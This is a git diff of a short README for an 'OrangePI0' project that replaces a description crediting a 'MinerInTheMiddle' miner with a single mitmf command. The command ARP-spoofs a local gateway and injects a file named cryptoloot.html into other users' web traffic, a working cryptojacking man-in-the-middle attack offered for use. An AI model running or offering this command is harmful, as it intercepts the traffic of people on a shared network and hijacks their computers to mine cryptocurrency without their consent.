@@ -1,3 +1,2 @@
 # OrangePI0
-Hacks for Orange Pi zero
-original miner file is by https://github.com/DotNetRussell/MinerInTheMiddle
+mitmf --inject --html-file /root/OrangePI0/cryptoloot.html --spoof --arp --gateway 192.168.0.1 -i eth0
